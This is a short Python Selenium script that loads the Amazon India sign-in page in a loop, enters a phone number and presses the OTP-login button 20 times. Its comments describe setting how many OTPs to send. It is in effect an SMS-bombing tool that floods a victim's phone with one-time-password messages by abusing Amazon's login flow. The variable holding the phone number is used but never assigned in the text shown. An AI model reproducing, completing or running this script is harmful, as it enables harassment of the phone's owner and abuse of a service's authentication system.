from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver =webdriver.Chrome()
#insert the path of the webdriver(chrome preferred)

frequency=20
#no of times you want to send the otp

for i in range(frequency):
	driver.get("https://www.amazon.in/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fie%3DUTF8%26tag%3Dabkexpt1-21%26ascsubtag%3D_k_EAIaIQobChMI5PDQ4Izs5AIVVxePCh2j8QOWEAAYASAAEgKcnPD_BwE_k_%26ext_vrnc%3Dhi%26gclid%3DEAIaIQobChMI5PDQ4Izs5AIVVxePCh2j8QOWEAAYASAAEgKcnPD_BwE%26ref_%3Dnav_signin&switch_account=")
	#to open the given link in the browser

	input=driver.find_element_by_id("ap_email")
	#to find an element with the given id

	input.send_keys(phone_number)
	#to fill the phone number in the input area

	continue_=driver.find_element_by_id("continue")
	#to find the ccontinue button using it's id

	continue_.click()
	#to click on the continue button

	otp=driver.find_element_by_id("auth-login-via-otp-btn")
	#to find the otp button using its id

	otp.click()
	#to click on the otp button and send the otp

driver.close()
